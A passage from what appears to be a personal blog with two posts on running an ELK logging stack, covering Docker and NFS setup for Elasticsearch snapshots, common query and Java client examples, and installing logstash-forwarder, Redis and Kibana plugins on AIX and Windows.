<h1 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">elasticsearch:</span><br><span class="line">  build: elasticsearch/</span><br><span class="line">  net: &quot;host&quot;</span><br><span class="line">  volumes:</span><br><span class="line">    - ./elasticsearch/config:/opt/elasticsearch/config:ro</span><br><span class="line">    - /var/data:/opt/elasticsearch/data</span><br><span class="line">    - /opt/backups/es_backup:/mount/backups</span><br><span class="line">  expose:</span><br><span class="line">    - &quot;9200&quot;</span><br><span class="line">    - &quot;9300&quot;</span><br></pre></td></tr></table></figure>

<h1 id="Install-x2F-Configure-NFS-server-and-client"><a href="#Install-x2F-Configure-NFS-server-and-client" class="headerlink" title="Install&#x2F;Configure NFS server and client"></a>Install&#x2F;Configure NFS server and client</h1><h2 id="In-node02-add-NFS-server"><a href="#In-node02-add-NFS-server" class="headerlink" title="In node02 add NFS server"></a>In node02 add NFS server</h2><p><code>sudo apt-get install nfs-kernel-server</code><br><code>vi /etc/exports</code> to add below setting<br><code>/opt/backups/es_backup node01(rw,sync,no_subtree_check)</code><br>then run <code>exportfs -ra</code></p>
<h2 id="In-node01-add-NFS-client"><a href="#In-node01-add-NFS-client" class="headerlink" title="In node01 add NFS client"></a>In node01 add NFS client</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nfs-common</span><br><span class="line">midir -p /opt/backups/es_backup</span><br><span class="line">mount node02:/opt/backups/es_backup es_backup</span><br></pre></td></tr></table></figure>
<p><code>vi /etc/fstab</code> to add below setting<br><code>10.13.135.38:/opt/backups/es_backup /opt/backups/es_backup nfs rw,hard,intr 0 0</code></p>
<h1 id="Restart-docker"><a href="#Restart-docker" class="headerlink" title="Restart docker"></a>Restart docker</h1><p>Run command <code>docker-compose up -d</code> to build and run ES.</p>
<h1 id="Create-snapshot-in-ES-with-sense"><a href="#Create-snapshot-in-ES-with-sense" class="headerlink" title="Create snapshot in ES with sense"></a>Create snapshot in ES with sense</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PUT _snapshot/logstash_repo</span><br><span class="line">&#123;</span><br><span class="line">    &quot;type&quot;: &quot;fs&quot;,</span><br><span class="line">    &quot;settings&quot;: &#123;</span><br><span class="line">      &quot;compress&quot;: &quot;true&quot;,</span><br><span class="line">      &quot;location&quot;: &quot;/mount/backups/logstash_repo&quot;,</span><br><span class="line">      &quot;max_snapshot_bytes_per_sec&quot; : &quot;50mb&quot;,</span><br><span class="line">      &quot;max_restore_bytes_per_sec&quot; : &quot;50mb&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Backup-x2F-Restore-indices"><a href="#Backup-x2F-Restore-indices" class="headerlink" title="Backup&#x2F;Restore indices"></a>Backup&#x2F;Restore indices</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PUT _snapshot/logstash_repo/snapshot_20151211</span><br><span class="line">&#123;</span><br><span class="line">  &quot;indices&quot;: &quot;logstash-2015.12.10,logstash-2015.12.11&quot;,</span><br><span class="line">  &quot;ignore_unavailable&quot;: &quot;true&quot;,</span><br><span class="line">  &quot;include_global_state&quot;: &quot;false&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET /_snapshot/logstash_repo/_all or GET /_snapshot/logstash_repo/snapshot_20151211/_status (Check)</span><br><span class="line"></span><br><span class="line">DELETE logstash-2015.12.10,logstash-2015.12.11 (Delete Indice)</span><br><span class="line"></span><br><span class="line">POST /_snapshot/logstash_repo/snapshot_20151211/_restore?wait_for_completion (Restore)</span><br><span class="line"></span><br><span class="line">DELETE /_snapshot/logstash_repo (Delete Snapshot)</span><br></pre></td></tr></table></figure>


<h1 id="Following-command-should-be-remembered"><a href="#Following-command-should-be-remembered" class="headerlink" title="Following command should be remembered"></a>Following command should be remembered</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">GET _cluster/health</span><br><span class="line">  or GET _cluster/health?level=indices</span><br><span class="line">  or GET _cluster/health?level=shards</span><br><span class="line">  or GET _cluster/health?wait_for_status=green</span><br><span class="line"></span><br><span class="line">GET _cat/indices</span><br><span class="line"></span><br><span class="line">GET logstash-2015.12.09/_settings</span><br><span class="line"></span><br><span class="line">GET logstash-2015.12.09/_count</span><br><span class="line"></span><br><span class="line">GET logstash-2015.12.09/_mapping</span><br><span class="line"></span><br><span class="line">GET logstash-2015.12.16/server-SystemOut/_search?q=message:Exception</span><br><span class="line"></span><br><span class="line">GET logstash-2015.12.08/server-SystemOut/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match&quot;: &#123;</span><br><span class="line">      &quot;message&quot;: &quot;Exception&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET logstash-2015.12.15/_search?fields=timestamp,host</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;filtered&quot;: &#123;</span><br><span class="line">      &quot;query&quot;: &#123;</span><br><span class="line">        &quot;match&quot;: &#123;</span><br><span class="line">          &quot;message&quot;: &quot;Exception&quot;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;filter&quot;: &#123;</span><br><span class="line">        &quot;range&quot;: &#123;</span><br><span class="line">          &quot;@timestamp&quot;: &#123;</span><br><span class="line">            &quot;gte&quot;: 1450212195957,</span><br><span class="line">            &quot;lte&quot;: 1450265395957,</span><br><span class="line">            &quot;format&quot;: &quot;epoch_millis&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;sort&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;@timestamp&quot;: &#123;</span><br><span class="line">        &quot;order&quot;: &quot;asc&quot;,</span><br><span class="line">        &quot;unmapped_type&quot;: &quot;boolean&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  &quot;size&quot;: 10,</span><br><span class="line">  &quot;from&quot;: 0,</span><br><span class="line">  &quot;fields&quot;: [&quot;host&quot;,&quot;message&quot;]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GET logstash-2015.12.15/_search?size=20&amp;fields=message</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;query_string&quot;: &#123;</span><br><span class="line">      &quot;query&quot;: &quot;message : Exception AND type : moon01&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Client-API-to-search-ES-cluster"><a href="#Client-API-to-search-ES-cluster" class="headerlink" title="Client API to search ES cluster"></a>Client API to search ES cluster</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">package dh;</span><br><span class="line"></span><br><span class="line">import io.searchbox.client.JestClient;</span><br><span class="line">import io.searchbox.client.JestClientFactory;</span><br><span class="line">import io.searchbox.client.config.HttpClientConfig;</span><br><span class="line">import io.searchbox.core.Search;</span><br><span class="line">import io.searchbox.core.SearchResult;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.Calendar;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">import org.elasticsearch.index.query.QueryBuilder;</span><br><span class="line">import org.elasticsearch.index.query.QueryBuilders;</span><br><span class="line">import org.elasticsearch.search.builder.SearchSourceBuilder;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">	public static void main(String[] args) throws IOException &#123;</span><br><span class="line">		JestClientFactory factory = new JestClientFactory();</span><br><span class="line">		factory.setHttpClientConfig(new HttpClientConfig.Builder(&quot;http://10.13.135.37:9200&quot;).build());</span><br><span class="line">		JestClient client = factory.getObject();</span><br><span class="line"></span><br><span class="line">		SearchSourceBuilder builder = new SearchSourceBuilder();</span><br><span class="line"></span><br><span class="line">		// single and mutilple criteria </span><br><span class="line">		QueryBuilder q1 = QueryBuilders.queryStringQuery(&quot;message : Exception AND type : moon01&quot;);</span><br><span class="line">		QueryBuilder q2 = QueryBuilders.matchQuery(&quot;message&quot;, &quot;Exception&quot;);</span><br><span class="line"></span><br><span class="line">		long now = System.currentTimeMillis();</span><br><span class="line">		Calendar c = Calendar.getInstance();</span><br><span class="line">		c.set(Calendar.DAY_OF_MONTH, c.get(Calendar.DAY_OF_MONTH) - 3);</span><br><span class="line">		long thatDay = c.getTimeInMillis();</span><br><span class="line"></span><br><span class="line">		String filtered = builder.query(</span><br><span class="line">				QueryBuilders.filteredQuery(QueryBuilders.queryFilter(q2), QueryBuilders.rangeQuery(&quot;@timestamp&quot;).from(</span><br><span class="line">						Long.toString(thatDay)).to(Long.toString(now)).format(&quot;epoch_millis&quot;))).sort(&quot;@timestamp&quot;)</span><br><span class="line">				.size(200).from(0).field(&quot;_source&quot;).toString();</span><br><span class="line"></span><br><span class="line">		System.out.println(&quot;DSL Query &quot; + filtered);</span><br><span class="line"></span><br><span class="line">		Search search = ((Search.Builder) new Search.Builder(filtered).addIndex(&quot;logstash-2015.12.15&quot;).addIndex(</span><br><span class="line">				&quot;logstash-2015.12.16&quot;)).build();</span><br><span class="line">		SearchResult result = (SearchResult) client.execute(search);</span><br><span class="line"></span><br><span class="line">		List&lt;SearchResult.Hit&lt;Log, Void&gt;&gt; hits = result.getHits(Log.class);</span><br><span class="line"></span><br><span class="line">		int i = 0;</span><br><span class="line">		for (SearchResult.Hit&lt;Log, Void&gt; hit : hits) &#123;</span><br><span class="line">			i++;</span><br><span class="line">			if (hit.source.getWas_message() != null &amp;&amp; hit.source.getWas_message().length() &gt; 200) &#123;</span><br><span class="line">				System.out.println(i + &quot; &quot; + hit.index + &quot;, &quot; + hit.source.getType() + &quot;, &quot;</span><br><span class="line">						+ hit.source.getWas_message().substring(0, 200));</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				System.out.println(i + &quot; &quot; + hit.index + &quot;, &quot; + hit.source.getType() + &quot;, &quot;</span><br><span class="line">						+ hit.source.getWas_message());</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(&quot;Total: &quot; + result.getTotal() + &quot;, Hits size: &quot; + hits.size());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Log &#123;</span><br><span class="line">	private String type;</span><br><span class="line">	private String was_message;</span><br><span class="line"></span><br><span class="line">	public String getType() &#123;</span><br><span class="line">		return type;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public void setType(String type) &#123;</span><br><span class="line">		this.type = type;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public String getWas_message() &#123;</span><br><span class="line">		return was_message;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public void setWas_message(String was_message) &#123;</span><br><span class="line">		this.was_message = was_message;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Software-installed-in-server"><a href="#Software-installed-in-server" class="headerlink" title="Software installed in server"></a>Software installed in server</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">fun:</span><br><span class="line">  cowsay</span><br><span class="line">  fortune</span><br><span class="line">  sl</span><br><span class="line">  jq</span><br><span class="line">  banner</span><br><span class="line">  toilet</span><br><span class="line">  figlet</span><br><span class="line">  libaa-bin</span><br><span class="line"></span><br><span class="line">utility:</span><br><span class="line">  htop</span><br><span class="line">  python-pip</span><br><span class="line">  atop</span><br><span class="line">  sysstat</span><br><span class="line"></span><br><span class="line">pip:</span><br><span class="line">  paramiko</span><br><span class="line">  fabric</span><br><span class="line">  elasticsearch</span><br><span class="line"></span><br><span class="line">nfs:</span><br><span class="line">  nfs-common</span><br><span class="line">  nfs-kernel-server</span><br></pre></td></tr></table></figure>

<h1 id="Monitor-docker-with-following-technology"><a href="#Monitor-docker-with-following-technology" class="headerlink" title="Monitor docker with following technology"></a>Monitor docker with following technology</h1><p>Rsyslog<br>ElasticSearch + Logstash + Kibana<br>Graphite<br>Collectd<br>grafana&#x2F;grafana<br>tutum&#x2F;influxdb<br>google&#x2F;cadvisor<br>Heka<br>flunted</p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://help.ubuntu.com/community/SettingUpNFSHowTo">https://help.ubuntu.com/community/SettingUpNFSHowTo</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-ELK-install-in-AIX-and-Windows" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2015-11-17T04:07:07.000Z"><a href="/2015/11/17/ELK-install-in-AIX-and-Windows/">2015-11-17</a></time>
      
      
  
    <h1 class="title"><a href="/2015/11/17/ELK-install-in-AIX-and-Windows/">ELK-install-in-AIX-and-Windows</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <ul>
<li><p>Requirements</p>
<ul>
<li>Basic<ul>
<li>jdk-8u65-windows-x64</li>
<li>Cygwin</li>
</ul>
</li>
<li>ELK<ul>
<li>elasticsearch-2.0.0</li>
<li>logstash-2.0.0</li>
<li>kibana-4.2.0-windows</li>
<li>logstash-forwarder-java-0.2.3</li>
<li>Redis-x64-2.8.2104.msi</li>
<li>marvel<ul>
<li>marvel-2.0.0</li>
<li>marvel-agent-2.0.0</li>
<li>license-2.0.0</li>
</ul>
</li>
</ul>
</li>
<li>tmux<ul>
<li>tmux-2.1</li>
<li>ncurses-6.0</li>
<li>libevent-2.0.22-stable</li>
</ul>
</li>
</ul>
</li>
<li><p>Run in AIX</p>
</li>
<li><p>Download logstash-forwarder-java from<br> <a target="_blank" rel="noopener" href="https://github.com/didfet/logstash-forwarder-java/releases/download/0.2.3/logstash-forwarder-java-0.2.3-bin.zip">https://github.com/didfet/logstash-forwarder-java/releases/download/0.2.3/logstash-forwarder-java-0.2.3-bin.zip</a></p>
</li>
<li><p>logstash.json</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;network&quot;: &#123;</span><br><span class="line">    &quot;servers&quot;: [ &quot;webserver:5043&quot; ],</span><br><span class="line">    &quot;ssl certificate&quot;: &quot;./lumberjack.crt&quot;,</span><br><span class="line">    &quot;ssl key&quot;: &quot;./lumberjack.key&quot;,</span><br><span class="line">    &quot;ssl ca&quot;: &quot;./keystore.jks&quot;,</span><br><span class="line">    &quot;timeout&quot;: 15</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  &quot;files&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;paths&quot;: [</span><br><span class="line">        &quot;/usr/IBM/WebSphere/AppServer/profiles/node/logs/node01/SystemOut.log&quot;</span><br><span class="line">      ],</span><br><span class="line">      &quot;fields&quot;: &#123; &quot;type&quot;: &quot;server-SystemOut&quot; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Generate key of lumberjack</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -days 3650 -batch -nodes -newkey rsa:2048 -keyout lumberjack.key -out lumberjack.crt -subj /CN=webserver</span><br><span class="line">/usr/java6/bin/keytool -importcert -trustcacerts -file lumberjack.crt -alias ca -keystore keystore.jks</span><br></pre></td></tr></table></figure>
</li>
<li><p>Run the program</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup /usr/java6/bin/java -jar logstash-forwarder-java-0.2.3.jar -config logstash.json -logfile logstash.log 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
</li>
<li><p>Run in Cygwin</p>
</li>
<li><p>Install license and marvel-agent in elasticsearch<br>  <code>bin/plugin.bat install file:///c:/Users/support/ELK/Software/license-2.0.0.zip</code><br>  <code>bin/plugin.bat install file:///c:/Users/support/ELK/Software/marvel-agent-2.0.0.zip</code></p>
</li>
<li><p>Install marvel in kibana (<a target="_blank" rel="noopener" href="https://www.elastic.co/guide/en/marvel/current/installing-marvel.html">https://www.elastic.co/guide/en/marvel/current/installing-marvel.html</a>)<br>  <code>bin/kibana.bat plugin --install marvel --url file://c:/Users/support/ELK/Software/marvel-2.0.0.tar.gz</code><br>  <code>bin/kibana.bat plugin --install sense --url file://c:/Users/support/ELK/Software/sense-2.0.0-beta1.tar.gz</code></p>
</li>
<li><p>Install tmux</p>
</li>
<li><p>Install libevent-2.0.22-stable and ncurses-6.0 and tmux-2.1</p>
</li>
<li><p>Configure logstash</p>
</li>
<li><p>logstash-shipper.conf</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">  lumberjack &#123;</span><br><span class="line">    port =&gt; 5043</span><br><span class="line">    type =&gt; &quot;logs&quot;</span><br><span class="line">    ssl_certificate =&gt; &quot;server/lumberjack.crt&quot;</span><br><span class="line">    ssl_key =&gt; &quot;server/lumberjack.key&quot;</span><br><span class="line"></span><br><span class="line">    codec =&gt; multiline &#123;</span><br><span class="line">     # pattern =&gt; &quot;(^.+Exception: .+)|(^\s+at .+)|(^\s+... \d+ more)|(^\s*Caused by:.+)&quot;</span><br><span class="line">      pattern =&gt; &quot;(^[a-zA-Z.]+(?:Error|Exception): .+)|(^\s+at .+)|(^\s+... \d+ more)|(^\s*Caused by:.+)&quot;</span><br><span class="line">      negate =&gt; false</span><br><span class="line">      what =&gt; &quot;previous&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filter &#123;</span><br><span class="line">   grok &#123;</span><br><span class="line">      match =&gt; [ &quot;message&quot;, &quot;\[(?&lt;timestamp&gt;%&#123;DATE_US&#125;\s+%&#123;HOUR&#125;:%&#123;MINUTE&#125;:%&#123;SECOND&#125;)\s+(?&lt;tz&gt;%&#123;WORD&#125;)\]\s+%&#123;GREEDYDATA:was_message&#125;&quot;]</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   date &#123;</span><br><span class="line">      match =&gt; [ &quot;timestamp&quot; , &quot;MM/dd/YY HH:mm:ss:SSS&quot; ]</span><br><span class="line">      target =&gt; &quot;@timestamp&quot;</span><br><span class="line">      timezone =&gt; &quot;Asia/Hong_Kong&quot;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   mutate &#123;</span><br><span class="line">     gsub =&gt; [&#x27;message&#x27;, &quot;\n&quot;, &quot; &quot;]</span><br><span class="line">     gsub =&gt; [&#x27;message&#x27;, &quot;\t&quot;, &quot; &quot;]</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">output &#123;</span><br><span class="line">  #stdout &#123; codec =&gt; &quot;rubydebug&quot; &#125;</span><br><span class="line"></span><br><span class="line">  redis &#123;</span><br><span class="line">    host =&gt; &quot;localhost&quot;</span><br><span class="line">    data_type =&gt; &quot;list&quot;</span><br><span class="line">    key =&gt; &quot;logstash&quot;</span><br><span class="line">    congestion_interval =&gt; 1</span><br><span class="line">    congestion_threshold =&gt; 20000000</span><br><span class="line">    workers =&gt; 16</span><br><span class="line">    # Batch processing requires redis &gt;= 2.4.0</span><br><span class="line">    batch =&gt; true</span><br><span class="line">    batch_events =&gt; 50</span><br><span class="line">    batch_timeout =&gt; 5</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>logstash-indexer.conf<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">  redis &#123;</span><br><span class="line">    host =&gt; &quot;localhost&quot;</span><br><span class="line">    data_type =&gt; &quot;list&quot;</span><br><span class="line">    key =&gt; &quot;logstash&quot;</span><br><span class="line">    threads =&gt; 2</span><br><span class="line">    batch_count =&gt; 1000</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">output &#123;</span><br><span class="line">  elasticsearch &#123;</span><br><span class="line">    hosts =&gt; [&quot;127.0.0.1&quot;]</span><br><span class="line">    manage_template =&gt; true</span><br><span class="line">    workers =&gt; 1</span><br><span class="line">    flush_size =&gt; 2000</span><br><span class="line">    idle_flush_time =&gt; 5</span><br><span class="line">    index =&gt; &quot;logstash-%&#123;+YYYY.MM.dd&#125;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Start logstash, elasticsearch, kibana</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ tmux</span><br><span class="line">$ ./elasticsearch.bat (ctrl + b + %)</span><br><span class="line">$ ./logstash.bat -f server/logstash-shipper.conf (ctrl + b + &quot;)</span><br><span class="line">$ ./logstash.bat -f server/logstash-indexer.conf (ctrl + b + &quot;)</span><br><span class="line">$ ./kibana.bat (ctrl + b + %)</span><br></pre></td></tr></table></figure>
</li>
<li><p>Reference<br><a target="_blank" rel="noopener" href="http://michael.bouvy.net/blog/en/2013/11/19/collect-visualize-your-logs-logstash-elasticsearch-redis-kibana/">http://michael.bouvy.net/blog/en/2013/11/19/collect-visualize-your-logs-logstash-elasticsearch-redis-kibana/</a><br><a target="_blank" rel="noopener" href="http://technologyconversations.com/2015/05/18/centralized-system-and-docker-logging-with-elk-stack/">http://technologyconversations.com/2015/05/18/centralized-system-and-docker-logging-with-elk-stack/</a><br><a target="_blank" rel="noopener" href="http://nathanleclaire.com/blog/2015/04/27/automating-docker-logging-elasticsearch-logstash-kibana-and-logspout/">http://nathanleclaire.com/blog/2015/04/27/automating-docker-logging-elasticsearch-logstash-kibana-and-logspout/</a><br><a target="_blank" rel="noopener" href="https://www.korekontrol.eu/blog/tips-for-centralized-logging-infrastructure-with-logstash">https://www.korekontrol.eu/blog/tips-for-centralized-logging-infrastructure-with-logstash</a><br><a target="_blank" rel="noopener" href="http://www.vmdoh.com/blog/centralizing-logs-lumberjack-logstash-and-elasticsearch">http://www.vmdoh.com/blog/centralizing-logs-lumberjack-logstash-and-elasticsearch</a><br><a target="_blank" rel="noopener" 